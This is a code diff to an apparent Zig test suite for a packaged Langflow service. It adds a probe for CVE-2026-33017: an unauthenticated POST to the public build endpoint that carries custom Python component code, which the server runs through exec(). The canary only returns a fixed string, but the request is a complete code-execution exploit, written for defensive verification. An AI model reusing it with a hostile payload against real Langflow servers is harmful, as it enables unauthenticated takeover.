@@ -80,7 +80,8 @@ pub fn main(init: std.process.Init) !void {
     );
     if (std.mem.eql(u8, ctx.phase, "seed")) {
         const body = try gpa.print(
-            "{{\"name\":\"native-{s}\",\"data\":{{\"nodes\":[],\"edges\":[]}}}}",
+            "{{\"name\":\"native-{s}\",\"access_type\":\"PUBLIC\",\"data\":{{\"nodes\":[],\"edge" ++
+                "s\":[]}}}}",
             .{ctx.run},
         );
         const created = try http(gpa, "POST", "/api/v1/flows/", auth, body);
@@ -94,6 +95,14 @@ pub fn main(init: std.process.Init) !void {
         suite,
         "persisted-flow",
         flows.status == 200 and std.mem.indexOf(u8, flows.body, name) != null,
+    );
+    const listing = try std.json.parseFromSliceLeaky(std.json.Value, gpa, flows.body, .{});
+    const flow_id = findFlowID(listing, name) orelse return error.NoFlow;
+    try ctx.result(
+        io,
+        suite,
+        "cve-2026-33017-present-contained",
+        try publicBuildCodeProbe(io, gpa, flow_id),
     );
     const inference = try std.process.run(gpa, io, .{
         .argv = &.{ "/usr/lib/langflow/bin/python", "-B", "/usr/lib/onnx/check.py", "inference" },
@@ -159,6 +168,74 @@ pub fn main(init: std.process.Init) !void {
         "private-listener",
         try driver.tcpPrivate(io, gpa, 7860, true),
     );
+}
+
+fn findFlowID(value: std.json.Value, name: []const u8) ?[]const u8 {
+    switch (value) {
+        .object => |object| {
+            if (object.get("name")) |candidate| if (candidate == .string and
+                std.mem.eql(u8, candidate.string, name))
+                if (object.get("id")) |id| if (id == .string) return id.string;
+            var it = object.iterator();
+            while (it.next()) |entry| if (findFlowID(entry.value_ptr.*, name)) |id| return id;
+        },
+        .array => |array| for (array.items) |item| {
+            if (findFlowID(item, name)) |id| return id;
+        },
+        else => {},
+    }
+    return null;
+}
+
+// CVE-2026-33017 passes unauthenticated caller-supplied component code to
+// Python exec(). The canary returns a fixed value in the direct build stream;
+// it never writes a file, invokes a command or opens a network connection.
+fn publicBuildCodeProbe(
+    io: Io,
+    gpa: Allocator,
+    flow_id: []const u8,
+) !bool {
+    const code =
+        "from lfx.custom.custom_component.component import Component\n" ++
+        "from lfx.io import Output\nfrom lfx.schema.data import Data\n" ++
+        "class WerewolfCanary(Component):\n    display_name = 'Canary'\n" ++
+        "    outputs = [Output(display_name='O', name='o', method='r')]\n" ++
+        "    def r(self) -> Data:\n" ++
+        "        return Data(data={'proof': 'werewolf-cve-' + '2026-33017:' + " ++
+        "'contained-code-execution'})\n";
+    const encoded = try std.json.Stringify.valueAlloc(gpa, code, .{});
+    const body = try gpa.print(
+        "{{\"data\":{{\"nodes\":[{{\"id\":\"Canary-001\",\"type\":\"genericNode\",\"position\":{" ++
+            "{\"x\":0,\"y\":0}},\"data\":{{\"id\":\"Canary-001\",\"type\":\"WerewolfCanary\",\"n" ++
+            "ode\":{{\"template\":{{\"code\":{{\"type\":\"code\",\"required\":true,\"show\":true" ++
+            ",\"multiline\":true,\"value\":{s},\"name\":\"code\",\"password\":false,\"advanced\"" ++
+            ":false,\"dynamic\":false}},\"_type\":\"Component\"}},\"description\":\"canary\",\"b" ++
+            "ase_classes\":[\"Data\"],\"display_name\":\"WerewolfCanary\",\"name\":\"WerewolfCan" ++
+            "ary\",\"frozen\":false,\"outputs\":[{{\"types\":[\"Data\"],\"selected\":\"Data\",\"" ++
+            "name\":\"o\",\"display_name\":\"O\",\"method\":\"r\",\"value\":\"__UNDEFINED__\",\"" ++
+            "cache\":true,\"allows_loop\":false,\"tool_mode\":false,\"hidden\":null,\"required_i" ++
+            "nputs\":null,\"group_outputs\":false}}],\"field_order\":[\"code\"],\"beta\":false," ++
+            "\"edited\":false}}}}}}],\"edges\":[]}},\"inputs\":null}}",
+        .{encoded},
+    );
+    const path = try gpa.print(
+        "/api/v1/build_public_tmp/{s}/flow?event_delivery=direct",
+        .{flow_id},
+    );
+    const response = try http(
+        gpa,
+        "POST",
+        path,
+        "Content-Type: application/json\r\nCookie: client_id=werewolf-native\r\n",
+        body,
+    );
+    if (response.status != 200) try Io.File.stderr().writeStreamingAll(io, response.body);
+    return response.status == 200 and
+        std.mem.indexOf(
+            u8,
+            response.body,
+            "werewolf-cve-2026-33017:contained-code-execution",
+        ) != null;
 }
 
 const Response = struct { status: u16, body: []const u8 };
